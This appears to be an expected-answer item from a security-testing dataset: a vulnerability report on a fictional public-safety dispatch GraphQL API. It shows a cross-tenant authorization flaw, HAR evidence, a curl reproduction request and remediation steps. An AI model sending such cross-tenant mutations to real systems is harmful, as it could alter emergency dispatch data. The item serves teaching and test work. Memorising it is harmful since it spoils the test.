# Expected Response

## System
- Domain: Government / Public Safety
- System: FirstResponse CAD Integration
- Example ID: GQL-0158

## Priority Findings

### Finding 1: Government CAD — Multi-Tenant BOLA via updateResource (Pattern 1.5)
**Severity:** Critical
**Category:** BOLA / Multi-Tenant / Cross-Tenant Access

**Summary:**
Per §5.0 (Pattern 1.5 — multi-tenant / cross-tenant access): The `updateResource` resolver does not validate tenant membership, enabling cross-tenant mutation of government CAD dispatch data. An attacker from `tenant-e26b` submitted `updateResource(id: "R-2158", input: {status: "approved", ownerId: "attacker-e26b30e4"})` against a CAD record belonging to `tenant-30e4`, receiving `CONFIDENTIAL-e26b30e4`. In Government / Public Safety, unauthorized mutation of CAD data can alter emergency dispatch, endanger responders, and compromise sensitive operational data.

**Evidence from HAR:**
- Request: `POST https://api.firstresponse-cad-in.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-e26b`
- Mutation: `updateResource(id: "R-2158", input: {status: "approved", ownerId: "attacker-e26b30e4"}) { resourceId status }`
- Response `200 OK`: `tenantId: "tenant-30e4"`, `ownerId: "other-user-e26b30e4"`, `sensitiveField: "CONFIDENTIAL-e26b30e4"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-e26b30e4`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 1.5 | Multi-tenant BOLA, no tenancy guard |
| HAR request | input.ownerId | attacker-e26b30e4 (client-injected) |
| HAR response | tenantId | Cross-tenant CAD data tenant-30e4 |
| HAR response | sensitiveField | CONFIDENTIAL-e26b30e4 |

## Steps to Reproduce

### Step 1 — updateResource CAD cross-tenant (HAR)
```bash
curl -s -X POST https://api.firstresponse-cad-in.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-e26b" \
  -d '{"query": "mutation { updateResource(id: \"R-2158\", input: {status: \"approved\", ownerId: \"attacker-e26b30e4\"}) { resourceId status } }"}'
```
**Vulnerable:** `tenant-30e4` CAD dispatch mutated. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Strip `ownerId` from `ResourceInput`.
3. CAD state changes require operator role validation against `$jwt.tenantId`.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
